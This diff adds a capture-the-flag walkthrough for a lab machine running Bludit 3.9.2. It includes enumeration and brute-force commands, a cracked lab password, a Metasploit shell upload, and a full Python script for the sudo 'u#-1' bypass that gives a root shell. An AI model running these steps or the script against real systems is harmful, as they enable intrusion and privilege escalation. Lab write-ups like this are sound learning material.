@@ -1,0 +1,34 @@
+- nmap scan to observe open ports
+- thorough gobuster to find unusual file "todo.txt", which when navigated to, revealed username "fergus" (gobuster dir -u 10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x pht,txt,pdf)
+- viewed page source of http://10.10.10.191/admin revealed a version 3.9.2 which turned out to be the CMS Bludit 3.9.2
+- Bludit 3.9.2 vulnerability revealed a Auth Brute Force Bypass vulnerability. Required a username and password, as well as being pointed to the login page (10.10.10.191/admin). Had the username Fergus (see above), and created a wordlist for the password brute force using a site crawl: cewl http://10.10.10.191 > newpass.txt, could then use that wordlist: python 48942.py -l http://10.10.10.191/admin -u user.txt -p newpass.txt
+- "hugo" user password hash could then be found hiding in the /var/www/*newerBluditVersion*/bl-content/databases/users.php file, plugged into crackstation.net to receive "Password120"
+- an additional vulnerability "Bludit - Directory Traversal Image File Upload (Metasploit)" exists to gain an actual shell (using hugo's credentials from the previous question), we can then retrieve the flag from hugo's folder using this shell
+- sudo --version revels the system is running a vulnerable version of sudo, "sudo 1.8.27 - Security Bypass" on exploit-db. Downloaded the .py file, put it on our shell via "(Meterpreter 1)(/) > upload /home/yetiswerve/Downloads/esc.py /tmp/esc.py". Had to edit the exploit.py file a bit:
+#!/usr/bin/python3
+
+import os
+
+#Get current username
+
+username = "hugo"
+
+
+#check which binary the user can run with sudo
+
+os.system("script -qc 'sudo -l > priv' /dev/null")
+
+os.system("script -qc \"cat priv | grep 'ALL' | cut -d ')' -f 2 > binary\" /dev/null")
+#os.system("script -qc 'cat priv | grep 'ALL' | cut -d ')' -f 2 > binary' /dev/null")
+
+binary_file = open("binary")
+
+binary= binary_file.read()
+
+#execute sudo exploit
+
+print("Lets hope it works")
+
+os.system(f"script -qc 'sudo -u#-1 {binary}' /dev/null")
+
+- but "python3 exploit.py" ultimately works and gives us the root shell to obtain the final flag.
